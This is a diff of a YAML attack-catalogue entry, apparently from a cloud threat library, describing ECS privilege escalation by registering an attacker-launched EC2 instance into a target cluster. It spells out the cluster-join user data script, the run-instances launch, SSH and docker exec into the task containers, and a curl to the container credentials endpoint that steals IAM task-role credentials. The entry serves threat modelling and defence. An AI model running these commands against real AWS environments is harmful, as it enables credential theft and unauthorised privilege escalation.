@@ -2,20 +2,8 @@ attack:
   id: aws-ecs-privesc-via-ec2-registration
   name: ECS Privilege Escalation via EC2 Instance Registration
   overview: |
-    This attack exploits EC2 and ECS permissions to achieve privilege escalation by creating a malicious EC2 instance and registering it to an existing ECS cluster. The attacker launches an EC2 instance with an IAM instance profile that has ECS access, configures it to join a target ECS cluster, and waits for ECS services to schedule containers on the compromised instance. Once containers are running on the attacker-controlled EC2 instance, the attacker can access the Docker runtime, penetrate the containers, and extract the IAM credentials associated with ECS task roles, which typically have elevated permissions for application workloads.
+    This attack leverages EC2 instance creation permissions to escalate privileges by registering a malicious EC2 instance into an existing ECS cluster. The attacker launches an EC2 instance with an ECS-optimized AMI and configures it to join a target ECS cluster through user data scripts. Once registered, ECS services deploy containers to the compromised instance, allowing the attacker to access the containers, extract their IAM role credentials, and assume higher-privileged ECS task roles.
   steps:
-    - title: Create User Data Script for ECS Cluster Registration
-      command: |
-        cat > /tmp/asd.sh << 'EOF'
-        #!/bin/bash
-        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
-        EOF
-      dependencies:
-        - Local file system access to create user data script
-        - Knowledge of target ECS cluster name
-      result: |
-        A user data script is created that will configure the EC2 instance to automatically register with the target ECS cluster upon launch by modifying the ECS agent configuration.
-      ttp: T1059.004 - Command and Scripting Interpreter: Unix Shell
     - title: Launch EC2 Instance with ECS Configuration
       command: |
         aws ec2 run-instances \
@@ -27,14 +15,26 @@ attack:
       dependencies:
         - ec2:RunInstances permission
         - iam:PassRole permission for the ECS instance profile
-        - Valid ECS-optimized AMI ID (e.g., amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
-        - Existing IAM instance profile with basic ECS permissions (ecs:RegisterContainerInstance, ecs:DeregisterContainerInstance, ecs:DiscoverPollEndpoint, ecs:Submit*)
-        - Existing SSH key pair for instance access
-        - Network access to target ECS cluster
+        - Valid SSH key pair (pwned) in the target region
+        - ECS-optimized AMI identifier (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
+        - User data script prepared at /tmp/asd.sh
+        - IAM instance profile with basic ECS permissions (ecs:RegisterContainerInstance, ecs:DeregisterContainerInstance, ecs:DiscoverPollEndpoint, ecs:Poll, ecs:Submit*)
       result: |
-        An EC2 instance is launched and automatically registers as a container instance within the target ECS cluster. The ECS scheduler may begin placing tasks and services on this compromised instance.
-      ttp: T1578.002 - Create Cloud Instance
-    - title: Access Containers and Extract ECS Task Role Credentials
+        An EC2 instance is launched with the attacker's SSH key and configured to automatically register with the target ECS cluster upon boot. The instance profile grants the EC2 instance permissions to communicate with ECS services.
+      ttp: T1078.004 - Valid Accounts: Cloud Accounts
+    - title: Configure EC2 Instance to Join ECS Cluster
+      command: |
+        #!/bin/bash
+        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
+      dependencies:
+        - Knowledge of target ECS cluster name
+        - EC2 instance with ECS agent installed (provided by ECS-optimized AMI)
+        - Network connectivity between EC2 instance and ECS service endpoints
+        - Security group rules allowing ECS agent communication
+      result: |
+        The EC2 instance successfully registers as a container instance within the target ECS cluster. The ECS scheduler can now deploy tasks and services to this compromised instance.
+      ttp: T1525 - Implant Internal Image
+    - title: Access ECS Task Containers and Extract IAM Credentials
       command: |
         # SSH into the compromised EC2 instance
         ssh -i pwned.pem ec2-user@<instance-ip>
@@ -42,16 +42,16 @@ attack:
         # List running containers
         docker ps
         
-        # Access container and extract credentials from metadata service
-        docker exec -it <container-id> /bin/sh
+        # Access container and extract IAM credentials
+        docker exec -it <container-id> /bin/bash
         curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
       dependencies:
-        - SSH access to the launched EC2 instance
-        - ECS tasks/services scheduled on the compromised instance
-        - Docker runtime access on the EC2 instance
-        - Network connectivity to AWS metadata service from container
+        - SSH access to the compromised EC2 instance
+        - ECS tasks deployed to the compromised instance
+        - Docker access on the EC2 instance
+        - ECS task roles attached to running containers
       result: |
-        The attacker gains access to IAM credentials associated with ECS task roles running on the compromised instance. These credentials typically have elevated permissions for accessing AWS services like S3, DynamoDB, RDS, or other application resources, achieving privilege escalation beyond the attacker's original permissions.
+        The attacker gains access to running ECS containers and extracts temporary IAM credentials associated with ECS task roles. These credentials typically have elevated permissions for application workloads, enabling further privilege escalation and lateral movement within the AWS environment.
       ttp: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
   stride_goal:
     - Elevation of Privilege
